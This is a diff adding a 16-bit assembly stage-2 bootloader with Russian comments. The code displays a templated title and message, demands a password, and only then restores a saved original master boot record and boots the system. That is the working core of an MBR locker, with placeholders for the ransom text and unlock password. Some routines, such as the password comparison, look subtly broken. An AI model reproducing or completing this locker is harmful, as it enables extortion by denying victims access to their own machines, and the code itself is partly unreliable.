@@ -1,0 +1,172 @@
+BITS 16
+ORG 0x8000
+
+start_stage2:
+    ; Очищаем экран
+    mov ax, 0x0003
+    int 0x10
+
+    ; Устанавливаем фон
+    mov ah, 0x06
+    mov al, 0
+    mov bh, 0x00
+    mov cx, 0
+    mov dx, 0x184F
+    int 0x10
+
+    ; Цвет текста
+    mov ax, 0x0A00
+    int 0x10
+
+    ; Выводим заголовок
+    mov si, msg_title
+    call print
+
+    ; Выводим тело
+    mov si, msg_body
+    call print
+
+    ; Выводим приглашение
+    mov si, msg_prompt
+    call print
+
+password_loop:
+    call get_password
+    call check_password
+    cmp byte [password_ok], 1
+    je restore_and_boot
+    
+    mov si, msg_wrong
+    call print
+    jmp password_loop
+
+restore_and_boot:
+    call restore_mbr
+    jmp load_os
+
+restore_mbr:
+    pusha
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 2
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jc .error
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7E00
+    mov ah, 0x03
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+.error:
+    popa
+    ret
+
+load_os:
+    mov ax, 0x0000
+    mov es, ax
+    mov bx, 0x7C00
+    mov ah, 0x02
+    mov al, 1
+    mov ch, 0
+    mov cl, 1
+    mov dh, 0
+    mov dl, 0x80
+    int 0x13
+    jmp 0x0000:0x7C00
+
+print:
+    lodsb
+    or al, al
+    jz .done
+    mov ah, 0x0E
+    int 0x10
+    jmp print
+.done:
+    ret
+
+get_password:
+    mov di, buffer
+.loop:
+    xor ax, ax
+    int 0x16
+    cmp al, 0x0D
+    je .done
+    cmp al, 0x08
+    je .backspace
+    stosb
+    mov ah, 0x0E
+    mov al, '*'
+    int 0x10
+    jmp .loop
+.backspace:
+    cmp di, buffer
+    je .loop
+    dec di
+    mov ah, 0x0E
+    mov al, 0x08
+    int 0x10
+    mov al, ' '
+    int 0x10
+    mov al, 0x08
+    int 0x10
+    jmp .loop
+.done:
+    mov byte [di], 0
+    ret
+
+check_password:
+    mov si, buffer
+    mov di, password
+.compare:
+    lodsb
+    or al, al
+    jz .check_end
+    cmpsb
+    jne .fail
+    jmp .compare
+.check_end:
+    cmp byte [di], 0
+    jne .fail
+    mov byte [password_ok], 1
+.fail:
+    ret
+
+hang:
+    cli
+    hlt
+    jmp hang
+
+; ===== ДАННЫЕ (БЕЗ ОГРАНИЧЕНИЙ) =====
+msg_title:
+    db 13,10,'========================================',13,10
+    db '     {TITLE} ',13,10
+    db '========================================',13,10,0
+
+msg_body:
+    db 13,10
+    db '{BODY}',13,10,0
+
+msg_prompt:
+    db 13,10,'Password: ',0
+
+msg_wrong:
+    db 13,10,'Wrong password!',13,10,0
+
+password:
+    db '{PASSWORD}',0
+
+buffer:
+    times 32 db 0
+
+password_ok:
+    db 0
